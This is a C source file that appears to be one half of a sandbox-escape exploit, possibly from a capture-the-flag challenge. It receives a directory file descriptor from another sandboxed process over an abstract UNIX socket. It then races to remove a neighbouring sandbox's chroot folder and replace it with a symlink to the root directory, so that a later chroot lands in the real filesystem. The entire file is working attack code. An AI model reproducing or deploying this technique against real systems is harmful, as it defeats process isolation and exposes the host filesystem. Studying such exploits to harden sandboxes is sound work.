#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/un.h>
#include <sys/socket.h>
#include <string.h>
#include <sys/un.h>
#include <fcntl.h>

#define RCV_NAME "rcv_name"
#define SND_NAME "snd_name"



int listen_for_connection() {
    /* Create named socked in abstract namespace, as sandboxes doesn't share file system. */
    int rcv_sk = socket(AF_UNIX, SOCK_STREAM, 0);
    if (rcv_sk == -1) {
        perror("[!] socket failed");
        return -1;
    }

    /* Bind abstract socket. The rcv_addr.sun_path[0] must be null byte to indicate this is an abstract socket. */
    struct sockaddr_un rcv_addr;
    memset(&rcv_addr, 0x0, sizeof(struct sockaddr_un));
    strncpy(&rcv_addr.sun_path[1], RCV_NAME, strlen(RCV_NAME) + 1);
    rcv_addr.sun_family = AF_UNIX;
    if (bind(rcv_sk, (struct sockaddr*) &rcv_addr, sizeof(sa_family_t) + strlen(RCV_NAME) + 1) == -1) {
        perror("[!] bind failed");
        return -1;
    }

    /* Listen for connections. */
    if (listen(rcv_sk, 1) == -1) {
        perror("[!] listen failed");
        return -1;
    }

    /* Return socket to first connection. */
    struct sockaddr_un snd_addr;
    socklen_t snd_addr_len = sizeof(struct sockaddr_un);
    int sk = accept(rcv_sk, (struct sockaddr *) &snd_addr, &snd_addr_len);
    if (sk == -1) {
        perror("[!] accept failed");
        return -1;
    }
    return sk;
}


int receive_fd(int sk) {
	int fd;
	char buf[1];
	struct iovec iov;
	struct msghdr msg;
	struct cmsghdr *cmsg;
	char cms[CMSG_SPACE(sizeof(int))];

	iov.iov_base = buf;
	iov.iov_len = 1;

	memset(&msg, 0, sizeof msg);
	msg.msg_name = 0;
	msg.msg_namelen = 0;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	msg.msg_control = (caddr_t)cms;
	msg.msg_controllen = sizeof cms;

	if (recvmsg(sk, &msg, 0) == -1) {
        perror("recvmsg failed");
        return -1;
    }

	cmsg = CMSG_FIRSTHDR(&msg);
	memmove(&fd, CMSG_DATA(cmsg), sizeof(int));

	return fd;
}

int receive_fd_from_sender() {
    int sk = listen_for_connection();
    if (sk == -1) {
        return -1;
    }

    int fd = receive_fd(sk);
    if (fd == -1) {
        return -1;
    }
    printf("[i] Received fd: %d\n", fd);
    return fd;
}

void substitude_chroot_folder(int fd) {
    /* Wait for the /tmp/chroots/2 folder to be created. */
    while (unlinkat(fd, "../2", AT_REMOVEDIR) == -1) {}
    /* And then remove it. Invoke unlinkat few times to decrease references count. */
    while (!unlinkat(fd, "../2", AT_REMOVEDIR)) {}

    /* Create symlink to / names /tmp/chroots/2, so that chroot(/tmp/chroots/2) has no effect. */
    symlinkat("/", fd, "../2");
}

int main() {
    /* Print some debug information about receiver process. */
    printf("[i] My pid: %d\n", getpid());

    /* Receive file descriptor to sender's chroot directory: /tmp/chroots/<sender sandbox idx>. */
    int fd = receive_fd_from_sender();
    if (fd == -1) {
        return -1;
    }

    substitude_chroot_folder(fd);
    

    return 0;
}